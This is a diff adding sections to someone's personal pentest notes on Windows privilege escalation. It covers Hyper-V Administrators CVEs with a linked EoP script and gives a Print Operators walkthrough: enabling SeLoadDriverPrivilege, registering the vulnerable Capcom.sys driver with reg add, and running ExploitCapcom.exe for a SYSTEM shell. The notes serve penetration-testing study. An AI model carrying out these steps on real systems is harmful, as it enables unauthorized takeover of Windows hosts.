@@ -371,6 +371,33 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
 - `sc start dns`
 - `net group "Domain Admins" /dom` check that we have the priv (or catch the shell)
 
+### Hyper-V Administrators
+
+- CVE-2018-0952
+- CVE-2019-0841
+- [Hyper V admin EOP - decoder it](https://github.com/decoder-it/Hyper-V-admin-EOP/blob/master/hyperv-eop.ps1)
+- Has been mitigated since March 2020
+
+### Print Operators
+
+- We  need to check for the `SeLoadDriverPrivilege` in a cmd shell launched as admin `whoami /priv`  
+![image](https://user-images.githubusercontent.com/96747355/164988812-a217a132-8e73-4220-a912-142128e7472e.png)  
+- We download this [tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) to enable the privilege. We need to add the few lines at the begining of the script
+```
+#include <stdio.h>
+#include "tchar.h"
+```
+- We can then compile it using cl.exe from a visual studio cmd `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`
+- We then have to download the [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) driver file 
+- We can then add the reference to the drive `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`
+- In powershell we check that the Capcom driver is not loaded with [DriverView.exe](http://www.nirsoft.net/utils/driverview.html)
+  - `.\DriverView.exe /stext drivers.txt`
+  - `cat drivers.txt | Select-String -pattern Capcom`
+ - Now we need to check it has been enabled  
+![image](https://user-images.githubusercontent.com/96747355/164989997-57ddd8d9-3994-4ff0-ac14-8e07dd81800a.png)  
+- Finally we can launch the exploit using [ExploitCapcom.exe](https://github.com/tandasat/ExploitCapcom) it will launch a shell as authority system
+
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
@@ -385,3 +412,4 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
 {% embed url="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" %} ADJUSTING TOKEN PRIVILEGES IN POWERSHELL - LEE HOLMES {% endembed %}  
 {% embed url="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77" %} Enable All Token Privileges - Mark Mo{% endembed %}  
 {% embed url="https://adsecurity.org/?p=4064" %} From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration{% endembed %}  
+{% embed url="https://github.com/hfiref0x/UACME" %} Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor - hfiref0x {% endembed %}  
